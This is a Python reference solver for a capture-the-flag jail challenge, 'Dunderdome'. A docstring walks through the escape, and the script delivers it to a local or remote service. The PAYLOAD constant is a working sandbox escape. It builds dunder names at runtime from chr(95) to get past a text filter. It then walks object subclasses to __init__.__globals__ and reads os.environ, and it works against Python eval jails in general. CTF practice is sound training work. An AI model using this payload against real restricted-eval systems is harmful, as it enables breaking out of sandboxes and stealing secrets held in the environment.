#!/usr/bin/env python3
"""
ZSCTF :: Dunderdome -- reference solver.

Intended path (fully fair -- every rule is printed in the banner and lives in
challenge/server.py):

  The jail forbids you from *typing* a dunder: "__" may not appear in the
  source, so `().__class__`, `__import__`, `"{0.__globals__}".format(...)` and
  every other literal-dunder escape is dead on arrival. It also strips the
  dangerous builtins (open, eval, __import__, ...) from the eval namespace.

  But it leaves `getattr` and `chr` in reach, and -- crucially -- it only
  screens the *text* of your expression, not the *strings you build at
  runtime*. So we construct the dunder names ourselves:

      U = chr(95) * 2                      # the string "__", never typed
      getattr((), U+'class'+U)             # -> tuple
      getattr(tuple, U+'base'+U)           # -> object
      getattr(object, U+'subclasses'+U)()  # -> every class in the process

  Every subclass found this way still carries its *original* module globals in
  `<class>.__init__.__globals__`. Pydunder classes defined in `os` (e.g.
  `os._wrap_close`) therefore hand us the live `os` module namespace -- and with
  it `os.environ`, where the flag lives. The restricted builtins table never
  mattered: we reached the real ones through an object we were allowed to hold.

  We read it back as the *value of the expression*, so the jail prints the flag
  for us.

Run against the source:        python solve.py --local ../challenge/server.py
Run against a deployment:       python solve.py --remote HOST PORT
"""
import re
import sys
import socket
import argparse
import subprocess

FLAG_RE = re.compile(r"zerosecurectf\{[^}\n]*\}")

# The escape, as a single expression. It is name-independent (it scans every
# subclass for the one whose module globals expose os.environ containing the
# flag), so it does not depend on a particular CPython subclass index/name.
#   - contains no "__"              (built from chr(95)*2 at runtime)
#   - uses only getattr + chr       (both in CORE_ALLOWED, never banned)
PAYLOAD = (
    "(lambda U: ["
    "v['environ']['ZSCTF_FLAG'] "
    "for c in getattr(getattr(getattr((),U+'class'+U),U+'base'+U),U+'subclasses'+U)() "
    "for v in [getattr(getattr(c,U+'init'+U,0),U+'globals'+U,0)] "
    "if v and 'environ' in v and 'ZSCTF_FLAG' in v['environ']"
    "][0])(chr(95)*2)"
)
assert "__" not in PAYLOAD, "payload must not contain a literal dunder"


# -- transport abstractions (same shape as the rest of the corpus) -----------
class Proc:
    def __init__(self, path):
        self.p = subprocess.Popen([sys.executable, path], stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, text=True, bufsize=1)

    def readline(self):
        return self.p.stdout.readline()

    def send(self, line):
        self.p.stdin.write(line + "\n")
        self.p.stdin.flush()

    def close(self):
        try:
            self.send("QUIT")
        except Exception:
            pass
        try:
            self.p.wait(timeout=5)
        except Exception:
            self.p.kill()


class Sock:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.f = self.s.makefile("rw", newline="\n")

    def readline(self):
        return self.f.readline()

    def send(self, line):
        self.f.write(line + "\n")
        self.f.flush()

    def close(self):
        try:
            self.send("QUIT")
        except Exception:
            pass
        self.s.close()


def read_banner(io):
    """Read lines until the 'commands:' marker that ends the banner."""
    while True:
        line = io.readline()
        if not line:
            raise RuntimeError("service closed during banner")
        if line.startswith("commands:"):
            return


def solve(io):
    read_banner(io)
    io.send(PAYLOAD)
    # The jail answers one line per input line; read a few in case of noise.
    for _ in range(8):
        line = io.readline()
        if not line:
            break
        m = FLAG_RE.search(line)
        if m:
            return line.rstrip("\n"), m.group(0)
        if line.startswith(("RESULT", "REJECTED", "ERROR")):
            return line.rstrip("\n"), None
    return "", None


def main():
    ap = argparse.ArgumentParser(description="Dunderdome reference solver")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--local", metavar="SERVER_PY", help="path to challenge/server.py")
    g.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"))
    args = ap.parse_args()

    io = Proc(args.local) if args.local else Sock(args.remote[0], int(args.remote[1]))
    try:
        print("[*] payload: %s" % PAYLOAD)
        resp, flag = solve(io)
        print("[*] service response: %s" % resp)
        if flag:
            print("[+] FLAG =", flag)
            return 0
        print("[-] no flag recovered")
        return 1
    finally:
        io.close()


if __name__ == "__main__":
    sys.exit(main())
